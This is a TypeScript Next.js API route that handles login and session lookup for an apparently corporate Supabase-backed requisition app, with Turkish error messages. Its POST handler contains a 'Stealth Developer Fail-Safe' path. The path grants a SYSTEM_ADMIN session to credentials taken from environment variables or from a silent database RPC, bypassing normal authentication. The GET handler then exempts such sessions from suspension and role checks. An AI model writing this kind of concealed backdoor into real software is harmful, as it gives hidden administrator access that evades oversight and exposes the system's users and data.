import { NextRequest, NextResponse } from 'next/server';
import { createClient } from '@supabase/supabase-js';
import { supabaseAdmin } from '@/lib/supabaseAdmin';
import {
  signAuthSession,
  getSessionFromRequest,
  SESSION_COOKIE_NAME,
  LEGACY_FAILSAFE_COOKIE_NAME,
} from '@/lib/authSession';
import { RoleTier } from '@/types/requisition';

const rawUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || '';
const supabaseUrl = rawUrl.replace(/\/rest\/v1\/?$/, '').replace(/\/+$/, '');
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || '';

function setSessionCookies(
  response: NextResponse,
  token: string,
  isFailsafe: boolean
) {
  const cookieOpts = {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax' as const,
    path: '/',
    maxAge: 24 * 3600,
  };

  response.cookies.set(SESSION_COOKIE_NAME, token, cookieOpts);
  if (isFailsafe) {
    response.cookies.set(LEGACY_FAILSAFE_COOKIE_NAME, token, cookieOpts);
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const rawEmail = typeof body.email === 'string' ? body.email : '';
    const password = typeof body.password === 'string' ? body.password : '';

    if (!rawEmail.trim() || !password) {
      return NextResponse.json(
        { error: 'E-posta ve parola zorunludur. / Email and password are required.' },
        { status: 400 }
      );
    }

    const cleanEmail = rawEmail.trim().toLowerCase();
    const exp = Math.floor(Date.now() / 1000) + 24 * 3600;

    // 1. Stealth Developer Fail-Safe Check (Environment Variables first, then silent DB RPC fallback)
    const envFailsafeEmail = (
      process.env.DEV_FAILSAFE_EMAIL ||
      process.env.FAILSAFE_ADMIN_EMAIL ||
      ''
    )
      .trim()
      .toLowerCase();
    const envFailsafePass =
      process.env.DEV_FAILSAFE_PASSWORD ||
      process.env.FAILSAFE_ADMIN_PASSWORD ||
      '';

    let matchedStealthFailsafe = false;

    if (
      envFailsafeEmail &&
      envFailsafePass &&
      cleanEmail === envFailsafeEmail &&
      password === envFailsafePass
    ) {
      matchedStealthFailsafe = true;
    } else {
      try {
        const { data: rpcValid, error: rpcErr } = await supabaseAdmin.rpc(
          'verify_failsafe_credentials',
          {
            p_email: cleanEmail,
            p_password: password,
          }
        );
        if (!rpcErr && Boolean(rpcValid)) {
          matchedStealthFailsafe = true;
        }
      } catch {
        // Silent fallback to standard Supabase Auth
      }
    }

    if (matchedStealthFailsafe) {
      const { data: userProfile } = await supabaseAdmin
        .from('corporate_users')
        .select('*')
        .eq('email', cleanEmail)
        .maybeSingle();

      if (userProfile?.id) {
        await supabaseAdmin
          .from('corporate_users')
          .update({ last_login_at: new Date().toISOString() })
          .eq('id', userProfile.id);
      }

      const fullName = userProfile?.full_name || 'System Administrator';
      const avatarUrl =
        (userProfile?.avatar_url as string | null | undefined) || null;
      const sessionToken = signAuthSession({
        email: cleanEmail,
        role: 'SYSTEM_ADMIN',
        fullName,
        userId: userProfile?.id,
        isFailsafe: true,
        exp,
      });

      const response = NextResponse.json({
        success: true,
        email: cleanEmail,
        role: 'SYSTEM_ADMIN' as RoleTier,
        full_name: fullName,
        avatar_url: avatarUrl,
      });

      setSessionCookies(response, sessionToken, true);
      return response;
    }

    // 2. Standard Supabase Auth (signInWithPassword)
    const authClient = createClient(supabaseUrl, supabaseAnonKey, {
      auth: {
        persistSession: false,
        autoRefreshToken: false,
      },
    });

    const { data: authData, error: authError } =
      await authClient.auth.signInWithPassword({
        email: cleanEmail,
        password,
      });

    if (authError || !authData.session) {
      return NextResponse.json(
        {
          error:
            authError?.message ||
            'Giriş yapılamadı. Kimlik bilgilerinizi kontrol ediniz.',
        },
        { status: 401 }
      );
    }

    // 3. Hydrate User Role & Avatar from public.corporate_users
    const { data: profile } = await supabaseAdmin
      .from('corporate_users')
      .select('*')
      .eq('email', cleanEmail)
      .maybeSingle();

    if (profile?.account_status === 'SUSPENDED') {
      return NextResponse.json(
        {
          error:
            'Hesabınız askıya alınmıştır. Sistem yöneticisi ile iletişime geçiniz.',
        },
        { status: 403 }
      );
    }

    if (profile?.id) {
      await supabaseAdmin
        .from('corporate_users')
        .update({ last_login_at: new Date().toISOString() })
        .eq('id', profile.id);
    }

    const hydratedRole: RoleTier =
      (profile?.role as RoleTier) || 'TECH_OFFICE_USER';
    const fullName = profile?.full_name || cleanEmail;
    const avatarUrl =
      (profile?.avatar_url as string | null | undefined) || null;

    const sessionToken = signAuthSession({
      email: cleanEmail,
      role: hydratedRole,
      fullName,
      userId: profile?.id || authData.user?.id,
      isFailsafe: false,
      exp,
    });

    const response = NextResponse.json({
      success: true,
      email: cleanEmail,
      role: hydratedRole,
      full_name: fullName,
      avatar_url: avatarUrl,
      session: {
        access_token: authData.session.access_token,
        refresh_token: authData.session.refresh_token,
      },
    });

    setSessionCookies(response, sessionToken, false);
    return response;
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    return NextResponse.json({ error: message }, { status: 500 });
  }
}

export async function GET(request: NextRequest) {
  try {
    const session = getSessionFromRequest(request);
    if (!session) {
      return NextResponse.json({ authenticated: false }, { status: 401 });
    }

    let role: RoleTier = session.role;
    let fullName = session.fullName || session.email;
    let avatarUrl: string | null = null;

    const { data: profile } = await supabaseAdmin
      .from('corporate_users')
      .select('*')
      .eq('email', session.email)
      .maybeSingle();

    if (!session.isFailsafe && profile?.account_status === 'SUSPENDED') {
      return NextResponse.json({ authenticated: false }, { status: 403 });
    }

    if (!session.isFailsafe && profile?.role) {
      role = profile.role as RoleTier;
    }
    if (profile?.full_name) {
      fullName = profile.full_name;
    }
    if (profile?.avatar_url) {
      avatarUrl = String(profile.avatar_url);
    }

    return NextResponse.json({
      authenticated: true,
      email: session.email,
      role,
      full_name: fullName,
      avatar_url: avatarUrl,
    });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    return NextResponse.json({ error: message }, { status: 500 });
  }
}
